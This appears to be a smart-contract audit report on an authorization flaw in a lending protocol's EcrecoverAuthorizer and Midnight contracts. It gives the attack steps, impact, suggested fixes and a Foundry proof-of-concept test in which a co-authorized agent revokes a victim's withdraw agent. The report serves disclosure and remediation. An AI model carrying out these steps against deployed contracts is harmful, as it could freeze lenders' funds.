### Title
Co-authorized agent can deauthorize withdrawAgent via EcrecoverAuthorizer, freezing lender funds - (File: src/periphery/EcrecoverAuthorizer.sol)

### Summary
`EcrecoverAuthorizer.setIsAuthorized` accepts a signature from any agent already authorized by the authorizer, not only the authorizer themselves. Because `Midnight.setIsAuthorized` also permits any authorized agent to modify any authorization entry on behalf of the authorizer, a co-authorized attacker can sign and submit an `Authorization(authorizer=victim, authorized=withdrawAgent, isAuthorized=false)` struct, deauthorizing the victim's withdraw agent without the victim's consent and without any privileged access.

### Finding Description

**Exact code path:**

`EcrecoverAuthorizer.setIsAuthorized` (lines 33–36) accepts the signature if:

```solidity
signer == authorization.authorizer
    || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer)
``` [1](#0-0) 

If the recovered signer is any agent authorized by the authorizer, the check passes. The function then calls:

```solidity
IMidnight(MIDNIGHT).setIsAuthorized(authorization.authorized, authorization.isAuthorized, authorization.authorizer);
``` [2](#0-1) 

`Midnight.setIsAuthorized` (lines 731–735) permits any authorized agent to write any authorization entry on behalf of the authorizer:

```solidity
require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
isAuthorized[onBehalf][authorized] = newIsAuthorized;
``` [3](#0-2) 

There is no restriction preventing an authorized agent from setting `isAuthorized=false` for a *different* authorized agent. The existing test `testSetIsAuthorizedAuthorization` explicitly confirms that an authorized agent can call `setIsAuthorized` for any `newAuthorized` address on behalf of the user. [4](#0-3) 

**Exploit flow (EcrecoverAuthorizer path):**

Preconditions (all set by victim, all normal usage):
- `isAuthorized[victim][EcrecoverAuthorizer] = true` (required for EcrecoverAuthorizer to act on victim's behalf)
- `isAuthorized[victim][withdrawAgent] = true` (victim's designated withdrawal operator)
- `isAuthorized[victim][attacker] = true` (attacker is a co-authorized agent)

Attack steps:
1. Attacker reads `ecrecoverAuthorizer.nonce(victim)` → value `N` (public state).
2. Attacker constructs `Authorization{authorizer=victim, authorized=withdrawAgent, isAuthorized=false, nonce=N, deadline=...}`.
3. Attacker signs this struct with **their own private key** (not victim's).
4. Attacker calls `ecrecoverAuthorizer.setIsAuthorized(auth, sig)`.
5. `ecrecover` returns attacker's address; check `isAuthorized[victim][attacker] == true` passes.
6. `EcrecoverAuthorizer` calls `Midnight.setIsAuthorized(withdrawAgent, false, victim)`; check `isAuthorized[victim][EcrecoverAuthorizer] == true` passes.
7. `isAuthorized[victim][withdrawAgent]` is set to `false`.
8. Any subsequent call by `withdrawAgent` to `Midnight.withdraw(..., victim, ...)` reverts with `Unauthorized`.

**Note:** A simpler direct path also exists — the attacker can call `Midnight.setIsAuthorized(withdrawAgent, false, victim)` directly without EcrecoverAuthorizer, since `isAuthorized[victim][attacker] == true` satisfies the check at line 732. The EcrecoverAuthorizer path is an additional vector. [5](#0-4) 

### Impact Explanation
A lender who relies on an authorized agent (e.g., a smart contract wallet, keeper, or automation bot) to call `Midnight.withdraw` on their behalf can have that agent deauthorized by any other co-authorized agent. The lender's credit remains locked in the market with no way to withdraw unless they can act directly (e.g., if they are a smart contract that cannot call Midnight directly, funds are permanently frozen). The attacker incurs only gas cost and can repeat the attack each time the victim re-authorizes the withdrawAgent.

### Likelihood Explanation
Preconditions are realistic: users of `EcrecoverAuthorizer` must authorize it in Midnight, and multi-agent setups (e.g., a keeper plus a backup agent) are a natural use case. The attacker only needs to be one of the victim's authorized agents — a position that could be obtained legitimately or through social engineering. The attack is repeatable at negligible cost and requires no special timing or oracle conditions.

### Recommendation
Restrict `EcrecoverAuthorizer.setIsAuthorized` so that only the authorizer themselves (not their delegates) may sign authorization changes — i.e., change the signer check to:

```solidity
require(signer == authorization.authorizer, Unauthorized());
```

Alternatively, restrict `Midnight.setIsAuthorized` so that an authorized agent can only manage their **own** authorization entry (i.e., only set `isAuthorized[onBehalf][msg.sender]`), preventing any agent from modifying another agent's authorization status on behalf of the authorizer.

### Proof of Concept

```solidity
// Foundry unit test
function testCoAuthorizedAgentDeauthorizesWithdrawAgent() public {
    address victim = makeAddr("victim");
    address withdrawAgent = makeAddr("withdrawAgent");
    // attacker has a known private key
    uint256 attackerKey = 0xDEAD;
    address attacker = vm.addr(attackerKey);

    // Victim sets up: authorizes EcrecoverAuthorizer, withdrawAgent, and attacker
    vm.startPrank(victim);
    midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, victim);
    midnight.setIsAuthorized(withdrawAgent, true, victim);
    midnight.setIsAuthorized(attacker, true, victim);
    vm.stopPrank();

    // Verify withdrawAgent is authorized
    assertTrue(midnight.isAuthorized(victim, withdrawAgent));

    // Attacker constructs deauthorization signed with attacker's own key
    Authorization memory auth = Authorization({
        authorizer: victim,
        authorized: withdrawAgent,
        isAuthorized: false,
        nonce: ecrecoverAuthorizer.nonce(victim), // = 0
        deadline: block.timestamp + 1 days
    });
    bytes32 structHash = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, auth));
    bytes32 domainSep = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(ecrecoverAuthorizer)));
    bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSep, structHash));
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(attackerKey, digest);
    Signature memory sig = Signature({v: v, r: r, s: s});

    // Attacker submits — no victim involvement
    vm.prank(attacker);
    ecrecoverAuthorizer.setIsAuthorized(auth, sig);

    // Assert: withdrawAgent is now deauthorized
    assertFalse(midnight.isAuthorized(victim, withdrawAgent));

    // Assert: withdrawAgent's withdraw call reverts
    vm.prank(withdrawAgent);
    vm.expectRevert(IMidnight.Unauthorized.selector);
    midnight.withdraw(market, 1, victim, withdrawAgent);
}
```

Expected assertions: `isAuthorized(victim, withdrawAgent) == false` after the attack; `withdraw` call by `withdrawAgent` reverts with `Unauthorized`.

### Citations

**File:** src/periphery/EcrecoverAuthorizer.sol (L33-36)
```text
        require(
            signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
            Unauthorized()
        );
```

**File:** src/periphery/EcrecoverAuthorizer.sol (L46-47)
```text
        IMidnight(MIDNIGHT)
            .setIsAuthorized(authorization.authorized, authorization.isAuthorized, authorization.authorizer);
```

**File:** src/Midnight.sol (L731-735)
```text
    function setIsAuthorized(address authorized, bool newIsAuthorized, address onBehalf) external {
        require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
        isAuthorized[onBehalf][authorized] = newIsAuthorized;
        emit EventsLib.SetIsAuthorized(msg.sender, authorized, newIsAuthorized, onBehalf);
    }
```

**File:** test/AuthorizationTest.sol (L290-304)
```text
    function testSetIsAuthorizedAuthorization(address user, address authorized, address newAuthorized) public {
        vm.assume(user != authorized);

        vm.prank(authorized);
        vm.expectRevert(IMidnight.Unauthorized.selector);
        midnight.setIsAuthorized(newAuthorized, true, user);

        vm.prank(user);
        midnight.setIsAuthorized(authorized, true, user);

        vm.prank(authorized);
        midnight.setIsAuthorized(newAuthorized, true, user);

        assertEq(midnight.isAuthorized(user, newAuthorized), true);
    }
```
